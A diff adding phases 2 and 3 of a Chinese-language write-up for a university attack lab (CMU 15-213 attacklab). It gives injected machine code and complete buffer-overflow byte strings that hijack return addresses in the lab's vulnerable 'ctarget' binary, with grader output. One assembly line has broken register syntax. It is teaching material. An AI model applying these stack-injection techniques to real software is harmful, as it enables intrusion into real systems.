@@ -100,3 +100,76 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:1:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 C0 17 40 00
 ```
+
+### phase_2
+#### phase_2的建议项
+Some Advice:
+• You will want to position a byte representation of the address of your injected code in such a way that
+ret instruction at the end of the code for getbuf will transfer control to it.
+• Recall that the first argument to a function is passed in register %rdi.
+• Your injected code should set the register to your cookie, and then use a ret instruction to transfer
+control to the first instruction in touch2.
+• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
+addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
+control, even when you are not returning from a call.
+• See the discussion in Appendix B on how to use tools to generate the byte-level representations of
+instruction sequences.
+
+发现cookie字段被存放在0x59b997fa处,放在rdx寄存器中
+
+结合材料中的建议，我们设置攻击代码的表示为
+```
+mov $0x59b997fa, $rdi
+ret 
+```
+转换为机器码
+```
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	c3                   	retq
+```
+我们将这段代码放在缓存区栈顶，同时利用溢出攻击覆盖掉返回地址
+```
+48 c7 c7 fa 97 b9 59 c3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 dc 61 55
+```
+同时，由于我们还需要返回到touch2函数，所以我们要延长攻击字符串长度，覆盖掉下一个返回地址。也就是当我们执行攻击代码的retq时，可以回到touch2函数中。
+```
+48 c7 c7 fa 97 b9 59 c3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00
+```
+
+实验结果，通过了
+```
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+
+### phase_3
+实验三的解决方法类似于实验二，我们将输入的字符串放置在控制代码之前，注入攻击的代码形式为
+```
+   <cookie(59b997fa)>: 35 39 62 39 39 37 66 61
+   <eol> 00 00 00 00 00 00 00 00
+   0:	bf 78 dc 61 55       	mov    $0x5561dc78,%edi
+   5:	c3                   	retq
+
+```
+然后我们需要修改，溢出攻击的第一个返回地址为mov指令所在位置；同时，由于我们还需要返回到touch3函数，所以我们还要利用溢出攻击覆盖掉返回地址。
+```
+35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 bf 78 dc 61 55 c3 00 00 00 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 88 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00
+```
+
+最后成功通过这个测试
+```
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 BF 78 DC 61 55 C3 00 00 00 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 88 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
+```
